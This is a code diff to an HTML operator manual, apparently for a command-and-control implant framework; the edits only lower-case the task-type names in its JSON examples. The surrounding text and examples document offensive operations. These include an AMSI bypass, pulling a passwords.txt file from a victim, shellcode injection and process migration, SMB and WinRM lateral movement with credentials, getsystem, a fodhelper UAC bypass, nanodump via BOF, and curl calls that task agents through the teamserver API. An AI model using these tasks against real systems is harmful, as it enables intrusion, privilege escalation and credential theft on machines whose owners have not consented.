@@ -820,8 +820,8 @@ powershell [System.Security.Principal.WindowsIdentity]::GetCurrent().Name</pre><
   <div class="callout tip"><span class="callout-icon">✓</span><div class="callout-body"><strong>AMSI bypass</strong> — the <code>powershell</code> command patches AMSI in the spawned PowerShell process before executing the expression. This bypasses real-time AMSI scanning for the current session.</div></div>
   <h2>Task JSON</h2>
   <div class="code-block"><div class="code-block-hdr"><span class="code-block-lang">json</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
-  <pre>{"type":"SHELL","args":{"cmd":"whoami /all"}}
-{"type":"POWERSHELL","args":{"expr":"Get-Process | Select-Object Name,Id"}}</pre></div>
+  <pre>{"type":"shell","args":{"cmd":"whoami /all"}}
+{"type":"powershell","args":{"expr":"Get-Process | Select-Object Name,Id"}}</pre></div>
 </section>
 
 <!-- CMD FILES -->
@@ -842,8 +842,8 @@ powershell [System.Security.Principal.WindowsIdentity]::GetCurrent().Name</pre><
   </table>
   <h2>Task JSON</h2>
   <div class="code-block"><div class="code-block-hdr"><span class="code-block-lang">json</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
-  <pre>{"type":"DOWNLOAD","args":{"path":"C:\\Users\\Admin\\Desktop\\passwords.txt"}}
-{"type":"UPLOAD","args":{"path":"C:\\Windows\\Temp\\tool.exe"},"payload_b64":"&lt;base64&gt;"}</pre></div>
+  <pre>{"type":"download","args":{"path":"C:\\Users\\Admin\\Desktop\\passwords.txt"}}
+{"type":"upload","args":{"path":"C:\\Windows\\Temp\\tool.exe"},"payload_b64":"&lt;base64&gt;"}</pre></div>
 </section>
 
 <!-- CMD PROCESS -->
@@ -866,8 +866,8 @@ kill &lt;pid&gt;                  # terminate a process</pre></div>
     <tr><td>MIGRATE</td><td>Migrate the agent into another existing process. The old PID is abandoned.</td></tr>
   </table>
   <div class="code-block"><div class="code-block-hdr"><span class="code-block-lang">json</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
-  <pre>{"type":"INJECT","args":{"pid":1234,"method":"APC"},"payload_b64":"&lt;shellcode b64&gt;"}
-{"type":"MIGRATE","args":{"pid":5678}}</pre></div>
+  <pre>{"type":"inject","args":{"pid":1234,"method":"APC"},"payload_b64":"&lt;shellcode b64&gt;"}
+{"type":"migrate","args":{"pid":5678}}</pre></div>
 </section>
 
 <!-- CMD LATERAL -->
@@ -893,8 +893,8 @@ kill &lt;pid&gt;                  # terminate a process</pre></div>
 rev2self                    # drop impersonation token</pre></div>
   <h2>Task JSON</h2>
   <div class="code-block"><div class="code-block-hdr"><span class="code-block-lang">json</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
-  <pre>{"type":"LATERAL_SMB","args":{"host":"10.10.10.5","user":"DOMAIN\\Admin","pass":"P@ss","payload":"C:\\Temp\\svc.exe"}}
-{"type":"LATERAL_WINRM","args":{"host":"10.10.10.5","user":"DOMAIN\\Admin","pass":"P@ss","cmd":"powershell -enc ..."}}</pre></div>
+  <pre>{"type":"lateral_smb","args":{"host":"10.10.10.5","user":"DOMAIN\\Admin","pass":"P@ss","payload":"C:\\Temp\\svc.exe"}}
+{"type":"lateral_winrm","args":{"host":"10.10.10.5","user":"DOMAIN\\Admin","pass":"P@ss","cmd":"powershell -enc ..."}}</pre></div>
 </section>
 
 <!-- CMD PERSISTENCE -->
@@ -942,8 +942,8 @@ maketoken DOMAIN\Admin P@ss1!   # create token with credentials
 rev2self             # revert to original token</pre></div>
   <h2>Task JSON</h2>
   <div class="code-block"><div class="code-block-hdr"><span class="code-block-lang">json</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
-  <pre>{"type":"GETSYSTEM","args":{}}
-{"type":"UAC_BYPASS","args":{"method":"fodhelper","payload":"C:\\Windows\\Temp\\svc.exe"}}</pre></div>
+  <pre>{"type":"getsystem","args":{}}
+{"type":"uac_bypass","args":{"method":"fodhelper","payload":"C:\\Windows\\Temp\\svc.exe"}}</pre></div>
 </section>
 <!-- EVASION OVERVIEW -->
 <section class="topic" id="t-evasion-overview">
@@ -1077,8 +1077,8 @@ bof run seatbelt -GroupsV2 -Tokens     # string arguments
 bof run async nanodump 1234            # async — ACK immediate</pre></div>
   <h2>Task JSON</h2>
   <div class="code-block"><div class="code-block-hdr"><span class="code-block-lang">json</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
-  <pre>{"type":"BOF_RUN","args":{"name":"whoami"},"payload_b64":"&lt;coff b64&gt;"}
-{"type":"BOF_RUN_ASYNC","args":{"name":"nanodump","args":"1234"},"payload_b64":"&lt;coff b64&gt;"}</pre></div>
+  <pre>{"type":"bof_run","args":{"name":"whoami"},"payload_b64":"&lt;coff b64&gt;"}
+{"type":"bof_run_async","args":{"name":"nanodump","args":"1234"},"payload_b64":"&lt;coff b64&gt;"}</pre></div>
 </section>
 
 <!-- BOF WRITE -->
@@ -1356,7 +1356,7 @@ curl --cert op.crt --key op.key https://127.0.0.1:31337/api/credentials | jq .</
   <h2>Task payload format</h2>
   <div class="code-block"><div class="code-block-hdr"><span class="code-block-lang">json</span><button class="code-block-copy" onclick="copyCode(this)">Copy</button></div>
   <pre>{
-  "type":        "SHELL",
+  "type":        "shell",
   "args":        {"cmd": "whoami /all"},
   "payload_b64": null
 }</pre></div>
@@ -1366,7 +1366,7 @@ curl --cert op.crt --key op.key https://127.0.0.1:31337/api/credentials | jq .</
 curl -s --cert ~/.endgame/profiles/admin.crt --key ~/.endgame/profiles/admin.key \
   https://127.0.0.1:31337/api/agents/1eb64181/tasks \
   -H "Content-Type: application/json" \
-  -d '{"type":"SHELL","args":{"cmd":"whoami"}}'</pre></div>
+  -d '{"type":"shell","args":{"cmd":"whoami"}}'</pre></div>
 </section>
 
 <!-- TASK TYPES -->
